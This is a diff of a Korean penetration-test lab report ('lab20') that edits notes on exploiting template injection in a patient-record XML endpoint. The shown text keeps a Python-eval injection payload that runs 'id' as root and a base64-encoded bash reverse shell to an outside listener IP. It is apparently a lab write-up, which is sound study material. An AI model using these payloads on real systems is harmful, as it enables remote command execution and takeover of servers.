@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 - lab20
 created: 2026-11-17
-modified: 2026-11-19T20:28:23.024Z
+modified: 2026-11-19T20:33:23.096Z
 published: 2026-11-17
 date: 2026-11-17
 tags:
@@ -381,6 +381,9 @@ PY
 `Patient 2 User (M), 26 years old, recieved from Test at 20261117123000`
 이 최종 출력 됐다. `template`의 내용인 `1+1`이 계산 됐음을 알 수 있다.
 
+\*이 코드는 python3 -c 'import urllib.requrest url=http://127.0.0.1:54321~~~'  한 줄 명령과 같다. 왜 굳이 입력값으로 쓰는가?
+\=> 저렇게 쓰면 쌍따옴표 홑따옴표를 자유롭게 쓸 수 있다.
+
 ![[00. Setting/00. 첨부파일/Pasted image 20261117151947.png]]
 
 `{__import__('os').popen('id').read()}`를 넣어보면 명령어가 실행됨을 알 수 있다. `root`의 권한으로 실행됐음을 확인했다.
@@ -397,29 +400,14 @@ from urllib.request import Request, urlopen
 
 xml = """<patient>
 <firstname>{__import__('os').system(__import__('base64').b64decode('YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS43Ni80NDMgMD4mMSc=').decode())}</firstname>
-<lastname>User</lastname>
-<sender_app>Test</sender_app>
-<timestamp>20261117123000</timestamp>
-<birth_date>01/01/2000</birth_date>
-<gender>M</gender>
-</patient>"""
 
-req = Request(
-    "http://127.0.0.1:54321/addPatient",
-    data=xml.encode(),
-    headers={"Content-Type": "application/xml"},
-    method="POST",
-)
-
-with urlopen(req) as response:
-    print(response.status)
-    print(response.read().decode())
-PY
 ```
 
-\=python3 -c 'import urllib.requrest url=http://127.0.0.1:54321~~~' 과 같음. 근데 왜 굳이 저렇게 쓰는가? => 저렇게 쓰면 쌍따옴표 홑따옴표를 자유롭게 쓸 수 있음
+`base64`로 인코딩한 리버스쉘을 디코딩할 수 있게 코드를 넣어주면,
 
 ![[00. Setting/00. 첨부파일/Pasted image 20261117170755.png]]
+
+대기해놓은 포트에서
 
 ## 6. 취약점
 
